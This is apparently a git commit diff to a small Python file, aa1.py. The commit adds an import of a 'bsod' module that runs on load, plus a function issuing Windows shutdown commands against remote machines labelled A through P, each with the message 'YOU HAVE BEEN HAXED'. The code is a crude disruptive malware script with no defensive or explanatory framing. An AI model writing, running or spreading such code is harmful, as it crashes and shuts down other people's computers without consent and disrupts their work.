9c2bee7c5aa62f56fc444884f85426fafdc4ce30
kb_swastik <76393434+Swastik-Sarkar@users.noreply.github.com>
2022-11-13 21:48:56 +0530

    Update aa1.py

--- v1/aa1.py
+++ v1/aa1.py
@@ -1,3 +1,23 @@
 import os
+from . import bsod
 
-os.system("shutdown /m A /c YOU HAVE BEEN HAXED")
+bsod.start()
+
+# ShutDown Users
+def shtdwn():
+  os.system("shutdown /m A /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m B /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m C /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m D /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m E /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m F /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m G /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m H /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m I /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m J /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m K /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m L /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m M /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m N /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m O /c YOU HAVE BEEN HAXED")
+  os.system("shutdown /m P /c YOU HAVE BEEN HAXED")
